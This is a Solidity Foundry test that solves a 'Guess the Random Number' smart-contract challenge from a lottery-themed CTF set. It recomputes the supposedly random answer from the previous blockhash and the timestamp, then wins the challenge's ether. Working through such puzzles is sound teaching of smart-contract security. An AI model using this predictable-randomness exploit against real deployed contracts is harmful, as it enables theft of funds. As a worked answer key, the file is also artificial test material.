// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;

import {Test, console} from "forge-std/Test.sol";
import {GuessTheRandomNumberChallenge} from "../../src/1-Lotteries/3-GuessTheRandomNumber.sol";

contract GuessTheRandomNumberTest is Test {
    address challengeAddress;

    uint256 number;
    uint256 timestamp;

    function setUp() public {
        vm.roll(10);
        number = vm.getBlockNumber();
        timestamp = vm.getBlockTimestamp();
        GuessTheRandomNumberChallenge challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
        challengeAddress = payable(address(challenge));
    }

    function testSolveGuessTheRandomNumber() public {
        GuessTheRandomNumberChallenge challenge = GuessTheRandomNumberChallenge(payable(challengeAddress));

        // [START]

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(number - 1), timestamp))));

        console.log("The answer is: ", answer);

        challenge.guess{value: 1 ether}(answer);

        // [END]

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
